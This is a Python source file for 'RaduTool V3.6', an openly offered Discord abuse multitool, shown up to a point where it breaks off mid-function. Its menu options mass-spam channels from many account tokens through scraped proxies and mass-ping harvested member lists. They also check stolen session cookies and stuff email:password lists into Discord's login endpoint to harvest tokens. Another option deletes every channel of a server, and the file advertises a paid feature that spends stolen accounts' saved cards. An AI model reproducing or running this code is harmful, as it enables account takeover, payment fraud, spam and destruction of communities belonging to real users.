###########################
### RaduTool V3.6 #########
### discord.gg/radutool ###
###########################
import os
import ctypes
import time
import threading
import re
import sys
import base64
import random
import json
import string
from json import dumps
# Install Modules #
try:
    import requests
    import colored
    import getpass
    import pystyle
    import discum
    import discord
    import easygui
    import colorama
    import datetime
    import glob
    import webbrowser
    import asyncio
    from colored import fg
    from json import loads
    from websocket import WebSocket
    from pystyle import Write, System, Colors, Colorate
    from itertools import cycle
    import websocket
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
    from discord.ext import commands
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install colored')
    os.system('pip install getpass')
    os.system('pip install bs4')
    os.system('pip install glob')
    os.system('pip install webbrowser')
    os.system('pip install asyncio')
    os.system('pip install easygui')
    os.system('pip install discum==1.1.0')
    os.system('pip install datetime')
    os.system('pip install pystyle')
    os.system('pip install discord')
    os.system('pip install itertools')
    os.system('pip install colorama')
    os.system('pip install websocket')
    os.system('pip install concurrent.futures')
    os.system('pip install discord.ext')
tokens = len(open('tokens.txt').readlines())
blue = fg(6)
reset = fg(7)
red = fg(1)
green = fg(2)
purple = fg(5)
pink = fg(216)
yellow = fg(226)
gray = fg(250)
version = "V3.6"
useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69'
lock = threading.Lock()
username = getpass.getuser()
def random2(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text
def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text
def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={random2(43)}; __dcfduid={random2(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }

headerschoices = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(headerschoices)
    if token:
        headers.update({"Authorization": token})
    return headers
def radutool3():
    username = getpass.getuser()
    tokens = len(open('tokens.txt').readlines())
    System.Clear()
    ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Tokens : [{tokens}] | Page 3')
    Write.Print(f'''
    \t\t     /$$$$$$$                  /$$                 /$$$$$$$$                  /$$
    \t\t    | $$__  $$                | $$                |__  $$__/                 | $$
    \t\t    | $$  \ $$  /$$$$$$   /$$$$$$$ /$$   /$$         | $$  /$$$$$$   /$$$$$$ | $$
    \t\t    | $$$$$$$/ |____  $$ /$$__  $$| $$  | $$         | $$ /$$__  $$ /$$__  $$| $$
    \t\t    | $$__  $$  /$$$$$$$| $$  | $$| $$  | $$         | $$| $$  \ $$| $$  \ $$| $$
    \t\t    | $$  \ $$ /$$__  $$| $$  | $$| $$  | $$         | $$| $$  | $$| $$  | $$| $$ 
    \t\t    | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$
    \t\t    |__/  |__/ \_______/ \_______/ \______/          |__/ \______/  \______/ |__/    
    \t\t\t[ > discord.gg/radutool | Welcome {username} | github.com/H4cK3dR4Du < ]\n''', Colors.purple_to_red, interval=0.000)
    Write.Print(f"""══════════════════════════════════════════════════════|Page 3|═════════════════════════════════════════════════════════
\t\t[61] Nitro Purchaser\t\t[71] Channel Pinger
\t\t[62] Check Nitro Token
\t\t[63] Proxy Generator
\t\t[64] Server Creator
\t\t[65] Discord Cookie Checker
\t\t[66] Server Emoji Spammer
\t\t[67] Multi Cookie Checker
\t\t[68] Email:Pass:Token > Token
\t\t[69] Token Gather [Email:Pass]
\t\t[70] Token Onliner""", Colors.purple_to_red, interval=0.000)
    Write.Print(f"\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
    Write.Print(f"\nroot@radutool ~> ", Colors.purple_to_red, interval=0.000); opc = input(purple)
    option_list = ["<", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71"]
    if opc not in option_list:
        print(f"\n{purple}[{red}Error{purple}]{reset} Invalid Option!")
        time.sleep(0.5)
        radutool3()
    if opc=="<":
        radutool2()
    if opc=="61":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Nitro Purchaser [Paid Version]')
        print(f"\n{purple}[{red}!{purple}]{reset} Nitro Purchaser Is On Radu Tool Paid Version...")
        Write.Print(f"""
[1] Visit Shop
[2] What Does It Contain?
[3] Back
        """, Colors.purple_to_red, interval=0.000)
        shop = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if shop=="1":
            webbrowser.open('https://radutool.sellix.io')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool3()
        if shop=="2":
            print(f"\n{purple}[{red}>{purple}]{reset} The nitro purchaser works as follows: With 1 or more tokens stored in tokens.txt, if you have a credit card or have a gift (.gift) purchased, you will automatically be sent to a webhook of yours, in case you have a credit card, you will start buying nitros at your choice, annual or monthly, boosts or classic")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool3()
        if shop=="3":
            radutool3()
    if opc=="62":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Check Nitro Token')
        print()
        with open('tokens.txt', 'r') as f:
            tokens = f.read().splitlines()

        for token in tokens:
            res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token))
            nitro_data = res.json()
            nitro = bool(len(nitro_data) > 0)
            if nitro:
                print(f"{purple}[{green}+{purple}]{reset} Token | {blue}{token} {reset}| Nitro : {blue}{nitro}")
            else:
                print(f"{purple}[{red}-{purple}]{reset} Token | {blue}{token} {reset}| Nitro : {blue}False")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool3()
    if opc=="63":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Proxy Generator')
        url = "https://www.sslproxies.org/"
        print()
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table', {'class': 'table table-striped table-bordered'})
        proxies = []
        for row in table.find_all('tr'):
            columns = row.find_all('td')
            if len(columns) < 2:
                continue
            ip = columns[0].text
            port = columns[1].text
            proxy = {'http': 'http://' + ip + ':' + port, 'https': 'https://' + ip + ':' + port}
            proxies.append(proxy)

        valid_proxies = []
        for proxy in proxies:
            try:
                response = requests.get('http://httpbin.org/ip', proxies=proxy, timeout=5)
                if response.ok:
                    valid_proxies.append(proxy)
                    print(f'{purple}[{green}+{purple}]{reset} Generated | {blue}{proxy}')
                    with open('data/proxies.txt', 'w') as prxy:
                        prxy.write(proxy + "\n")
            except:
                continue
    if opc=="64":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Creator')
        def ascii():
            Write.Print(f"""
   ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗      ██████╗██████╗ ███████╗ █████╗ ████████╗ ██████╗ ██████╗ 
   ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
   ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝    ██║     ██████╔╝█████╗  ███████║   ██║   ██║   ██║██████╔╝
   ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██║   ██║██╔══██╗
   ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
   ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    """, Colors.purple_to_red, interval=0.000)
        tokent = input(f"\n{purple}[{red}>{purple}]{reset} Bot Token : ")
        System.Clear()
        ascii()
        while True:
            print(f"\n{purple}[{red}1{purple}]{reset} Server Shop")
            print(f"{purple}[{red}2{purple}]{reset} Server Rewards")
            opt = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")

            if opt=="1":
                print(f"\n{purple}[{red}>{purple}]{reset} Type : !shop")
                client = commands.Bot(command_prefix="!", intents=discord.Intents().all())
                
                @client.command()

                async def shop(ctx):
                            for channel in ctx.guild.channels:
                                            try:
                                                await channel.delete()
                                                print(f"{purple}[{red}>{purple}]{reset} Deleted : #{channel.name}")
                                            except:
                                                pass
                                                print(f"{purple}[{red}>{purple}]{reset} Couldn't Delete : #{channel.name}")
                            try:
                                categoryy = await ctx.guild.create_category('# OO1 . Pinned')
                                categoryy2 = await ctx.guild.create_category('# OO2 . Info')
                                categoryy3 = await ctx.guild.create_category('# OO3 . Public')
                                categoryy5 = await ctx.guild.create_category('# OO4 . Shop')
                                categoryy4 = await ctx.guild.create_category('# OO5 . Ticket/Support')
                                print(f"\n{purple}[{red}>{purple}]{reset} Created : {categoryy}")
                                print(f"{purple}[{red}>{purple}]{reset} Created : {categoryy2}")
                                print(f"{purple}[{red}>{purple}]{reset} Created : {categoryy3}")
                                print(f"{purple}[{red}>{purple}]{reset} Created : {categoryy4}")
                                print(f"{purple}[{red}>{purple}]{reset} Created : {categoryy5}")
                                await ctx.guild.create_text_channel('🎫﹒wlc', category=categoryy)
                                await ctx.guild.create_text_channel('🎫﹒rules', category=categoryy)
                                await ctx.guild.create_text_channel('🎫﹒announces', category=categoryy)
                                await ctx.guild.create_text_channel('🎫﹒info', category=categoryy)

                                await ctx.guild.create_text_channel('🍾﹒boosters', category=categoryy2)
                                await ctx.guild.create_text_channel('🍾﹒how-to-buy', category=categoryy2)
                                await ctx.guild.create_text_channel('🍾﹒pay-methods', category=categoryy2)
                                await ctx.guild.create_text_channel('🍾﹒invites', category=categoryy2)

                                await ctx.guild.create_text_channel('🌼﹒general', category=categoryy3)
                                await ctx.guild.create_text_channel('🌼﹒cmds', category=categoryy3)
                                await ctx.guild.create_text_channel('🌼﹒shitpost', category=categoryy3)
                                await ctx.guild.create_text_channel('🌼﹒random', category=categoryy3)
                                await ctx.guild.create_text_channel('🌼﹒spam', category=categoryy3)

                                await ctx.guild.create_text_channel('🏷️﹒ticket', category=categoryy4)
                                await ctx.guild.create_text_channel('🏷️﹒ticket-rules', category=categoryy4)

                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('🛒﹒YourItem', category=categoryy5)
                                await ctx.guild.create_text_channel('⭐﹒Vouchs', category=categoryy5)
                                await ctx.guild.create_text_channel('⭐﹒Proofs', category=categoryy5)
                                print(f"\n{purple}[{red}>{purple}]{reset} Succesfully Created All Channels!")
                            except:
                                pass
                client.run(tokent)
            if opt=="2":
                print(f"\n{purple}[{red}>{purple}]{reset} Type : !reward")
                client = commands.Bot(command_prefix="!", intents=discord.Intents().all())
                
                @client.command()
                async def reward(ctx):
                            for channel in ctx.guild.channels:
                                            try:
                                                await channel.delete()
                                                print(f"{purple}[{red}>{purple}]{reset} Deleted : #{channel.name}")
                                            except:
                                                pass
                                                print(f"{purple}[{red}>{purple}]{reset} Couldn't Delete : #{channel.name}")
                            try:
                                category = await ctx.guild.create_category('# OO1 . Pinned')
                                category2 = await ctx.guild.create_category('# OO2 . info')
                                category3 = await ctx.guild.create_category('# OO3 . rewards')
                                category4 = await ctx.guild.create_category('⚒﹒STAFF')
                                category5 = await ctx.guild.create_category('# OO4 . social')
                                category6 = await ctx.guild.create_category('# OO5 . events')
                                category7 = await ctx.guild.create_category('# OO6 . claim')
                                category8 = await ctx.guild.create_category('# OO7 . vouches')
                                print(f"\n{purple}[{red}>{purple}]{reset} Created: {category}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category2}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category3}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category4}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category5}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category6}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category7}")
                                print(f"{purple}[{red}>{purple}]{reset} Created: {category8}")
                                await ctx.guild.create_text_channel('🎫﹒╴wlc﹒₊°｡﹒', category=category)
                                await ctx.guild.create_text_channel('📑﹒✬﹒rules﹒', category=category)
                                await ctx.guild.create_text_channel('🎤﹒✬﹒anounces﹒', category=category)
                                await ctx.guild.create_text_channel('🔭﹒✬﹒click-me﹒', category=category)

                                await ctx.guild.create_text_channel('⊢﹒📩﹒⁂﹒invites', category=category2)
                                await ctx.guild.create_text_channel('ılıl，💽﹒events-op', category=category2)
                                await ctx.guild.create_text_channel('ılıl，🍾﹒boosters', category=category2)
                                await ctx.guild.create_text_channel('ılıl，🥢﹒autorol', category=category2)
                                await ctx.guild.create_text_channel('ılıl，👥﹒member-staff', category=category2)

                                await ctx.guild.create_text_channel('○﹒🎱﹒rw-boost﹒✶', category=category3)
                                await ctx.guild.create_text_channel('○﹒🏸﹒rw-invites﹒✶', category=category3)
                                await ctx.guild.create_text_channel('○﹒🎳﹒rw-level﹒✶', category=category3)
                                await ctx.guild.create_text_channel('○﹒🛷﹒allys﹒✶', category=category3)

                                await ctx.guild.create_text_channel('🎮﹒rules-staff', category=category4)
                                await ctx.guild.create_text_channel('🥼﹒chat-staff', category=category4)
                                await ctx.guild.create_text_channel('🎨﹒ban', category=category4)
                                await ctx.guild.create_text_channel('🧦﹒configuration-sv', category=category4)
                                await ctx.guild.create_text_channel('📣﹒anounces-staff', category=category4)

                                await ctx.guild.create_text_channel('％﹒🎰﹕general', category=category5)
                                await ctx.guild.create_text_channel('⚙﹒🔧﹕comands', category=category5)
                                await ctx.guild.create_text_channel('％﹒🎧﹕random', category=category5)
                                await ctx.guild.create_text_channel('％﹒📸﹕shitpost', category=category5)

                                await ctx.guild.create_text_channel('✬﹒🎪﹐giveaway¹', category=category6)
                                await ctx.guild.create_text_channel('✬﹒🀄﹐giveaway²', category=category6)
                                await ctx.guild.create_text_channel('✬﹒🎪﹐giveaway³', category=category6)
                                await ctx.guild.create_text_channel('✬﹒🀄﹐giveaway⁴', category=category6)
                                await ctx.guild.create_text_channel('✬﹒🎪﹐giveaway⁵', category=category6)
                                await ctx.guild.create_text_channel('▢・🎠﹕gw-boosters', category=category6)
                                await ctx.guild.create_text_channel('▢・🧮﹕gw-support', category=category6)
                                await ctx.guild.create_text_channel('▢・🎢﹕drops', category=category6)

                                await ctx.guild.create_text_channel('⇣⇡﹒🔑﹒ticket-rules﹒', category=category7)
                                await ctx.guild.create_text_channel('⇣⇡﹒💄﹒tickets﹒', category=category7)

                                await ctx.guild.create_text_channel('🌹﹒✧﹒vouchs', category=category8)
                                await ctx.guild.create_text_channel('🍚﹒✧﹒vouchs-bsters', category=category8)
                                await ctx.guild.create_text_channel('🌼﹒✧﹒proofs', category=category8)
                                print(f"{purple}[{red}>{purple}]{reset} Successfully Created All Channels!")
                            except:
                                pass
                client.run(tokent)
    if opc=="65":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Discord Cookie Checker')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Content-Type": "application/json",
            "X-Super-Properties": "eyJvcyI6IkpPU0UiLCJicm93c2VyIjoiQ2hyb21lIiwib3BlbiI6IkpvaW5TYW5kYm94IiwicmVhZCI6bnVsbCwiaWF0IjoxNjIwMzQ5MTM5LCJ2ZXJzaW9uIjoiMS4wLjAiLCJvd25lciI6IjEwMDAiLCJjaWQiOiI0ODUyODYyMTgxODYyNjQ5OSIsInJlZmVycmVyIjoicHJvZmlsZSIsIm9zcyI6IkFkbWluIiwic3RhdGUiOiI2MTQyMjM2MjgyMjE2OTU5MTg5MzQifQ=="
        }
        cookie = input(f"\n{purple}[{red}>{purple}]{reset} Cookie : ")
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, cookies={"__cfduid": cookie})
        if response.status_code == 200:
            print()
            print(f"{purple}[{green}+{purple}]{reset} Valid Discord Cookie")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool3()
        else:
            print()
            print(f"{purple}[{red}-{purple}]{reset} Invalid Discord Cookie")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool3()
    if opc=="66":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Emoji Spammer')
        def raider():  
            channel7 = input(f"\n{purple}[{red}>{purple}]{reset} Channel ID : ")
            radulist = ['😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴']
            delay = "0"
            tokens = open("tokens.txt", "r").read().splitlines()
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            def spam(token, channel7):
                url = f"https://discord.com/api/v9/channels/{channel7}/messages"
                while True:
                    caracteres = string.ascii_letters + string.digits
                    selected_emojis = random.sample(radulist, 30)
                    selected_emojis_str = ' '.join(selected_emojis)
                    data = {"content": f"{selected_emojis_str}"}
                    header = {"authorization": token}
                    time.sleep(0.0001)
                    r = requests.post(url, data=data, headers=header, proxies=proxies)
                    if r.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")              
            def thread():
                channel_id = channel7
                for token in tokens:
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id)).start()
            thread()                         
        raider()
    if opc=="67":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Multi Discord Cookie Checker')
        headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                    "Content-Type": "application/json",
                    "X-Super-Properties": "eyJvcyI6IkpPU0UiLCJicm93c2VyIjoiQ2hyb21lIiwib3BlbiI6IkpvaW5TYW5kYm94IiwicmVhZCI6bnVsbCwiaWF0IjoxNjIwMzQ5MTM5LCJ2ZXJzaW9uIjoiMS4wLjAiLCJvd25lciI6IjEwMDAiLCJjaWQiOiI0ODUyODYyMTgxODYyNjQ5OSIsInJlZmVycmVyIjoicHJvZmlsZSIsIm9zcyI6IkFkbWluIiwic3RhdGUiOiI2MTQyMjM2MjgyMjE2OTU5MTg5MzQifQ=="
                }
        cookies = open('data/cookies.txt', 'r').read().splitlines()
        for cookie in cookies:
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, cookies={"__cfduid": cookie})
            if response.status_code == 200:
                print()
                print(f"{purple}[{green}+{purple}]{reset} Valid Discord Cookie | {blue}{cookie}")
            else:
                print()
                print(f"{purple}[{red}-{purple}]{reset} Invalid Discord Cookie | {blue}{cookie}")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool3()
    if opc=="68":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Email:Pass:Token > Token')
        tokens = open("tokens.txt").read().splitlines()
        for token in tokens:
            token1 = token.split(":")[2]
            with open("tokens.txt", 'a') as done:
                done.write(token1 + "\n")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool3()
    if opc=="69":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Gather [Email & Pass]')
        unverified = 0
        valid = 0
        bad = 0
        with open("data/accounts.txt") as f:
            lines = f.readlines()

        for line in lines:
            email, password = line.strip().split(":")
            r = requests.post("https://discord.com/api/v9/auth/login", json={"email": email, "password": password})
            if r.status_code == 200:
                print(f"{purple}[{green}+{purple}]{reset} Valid Account & Password | {blue}{email}:{password}")
                token = r.json()['token']
                print(f"{purple}[{green}+{purple}]{reset} Got Token | {blue}{token}")
                valid += 1
            if r.status_code == 429:
                print(f"{purple}[{yellow}%{purple}]{reset} Unverified Account & Password | {blue}{email}:{password}")
                token = r.json()['token']
                print(f"{purple}[{yellow}%{purple}]{reset} Got Unverified Token | {blue}{token}")
                unverified += 1
            else:
                print(f"{purple}[{red}-{purple}]{reset} Invalid Account & Password | {blue}{email}:{password}")
                print(f"{purple}[{red}-{purple}]{reset} Failed To Get Token")
                bad += 1
        Write.Print(f"\n\t\t\t\t\t\tToken Gather Stats : \n", Colors.purple_to_red, interval=0.000)
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_red, interval=0.000)
        print(f"\t\t\t\tSuccess : [{green}{valid}{reset}] | Failed : [{red}{bad}{reset}] | Unverfied Tokens : [{yellow}{unverified}{reset}]")
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        System.Clear()
        radutool3()
    if opc=="70":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Onliner')
        name = input(f"\n{purple}[{red}>{purple}]{reset} Name : ")
        details = input(f"{purple}[{red}>{purple}]{reset} Details : ")
        state = input(f"{purple}[{red}>{purple}]{reset} State : ")
        print()
        class tokenon:
                def __init__(self, token) -> None:
                    self.token    = token
                def __online__(self):
                    ws = websocket.WebSocket()
                    ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                    response = ws.recv()
                    event = json.loads(response)
                    heartbeat = int(event["d"]["heartbeat_interval"]) / 1000
                    ws.send(
                        json.dumps(
                            {
                                "op": 2,
                                "d": {
                                    "token": self.token,
                                    "properties": {
                                        "$os": sys.platform,
                                        "$browser": "RTB",
                                        "$device": f"{sys.platform} Device",
                                    },
                                    "presence": {
                                        "game": {
                                            "name": name,
                                            "type": 0,
                                            "details": details,
                                            "state": state,
                                        },
                                        "status": "online",
                                        "since": 0,
                                        "activities": [],
                                        "afk": False,
                                    },
                                },
                                "s": None,
                            "t": None,
                            }
                        )
                    )
                    print(f"{purple}[{green}+{purple}]{reset} Successfully Onlined | {blue}{token}")
                    while True:
                        heartbeatJSON = {
                            "op": 1, 
                            "token": self.token, 
                            "d": "null"
                        }
                        ws.send(json.dumps(heartbeatJSON))
                        time.sleep(heartbeat)
        for token in open("tokens.txt", "r").read().splitlines():
            threading.Thread(target=tokenon(token).__online__).start()
        time.sleep(2)
        input(f'\n{purple}[{red}>{purple}]{reset} Press ENTER : ')
        radutool3()
    if opc=="71":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Channel Pinger')
            tokens = open("tokens.txt", "r").read().splitlines()
            server = input(f'\n{purple}[{red}>{purple}]{reset} Server ID : ')
            channel = input(f'{purple}[{red}>{purple}]{reset} Channel ID : ')
            mess = input(f'{purple}[{red}>{purple}]{reset} Message : ')
            delay = float(input(f'{purple}[{red}>{purple}]{reset} Delay : '))
            with open("tokens.txt") as f:
                    firstline = f.readline().rstrip()
                    bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('data/users.txt', "w")
            for element in memberslist:
                f.write(f'<@{element}>' + "\n")
            f.close()
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            def spam(token, channel7, mess):
                url = f"https://discord.com/api/v9/channels/{channel7}/messages"
                while True:
                    with open("data/users.txt", "r") as f:
                        lines = f.readlines()
                    random_users = random.sample(lines, 25)
                    caracteres = string.ascii_letters + string.digits
                    cadena_aleatoria = ''.join(random.choices(caracteres, k=6))
                    data = {
                        "content": mess + f' - ||{random_users}|| - {cadena_aleatoria}'
                        }
                    header = {
                        "authorization": token
                        }
                    time.sleep(0.0001)
                    r = requests.post(url, data=data, headers=header, proxies=proxies)
                    if r.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                    else:
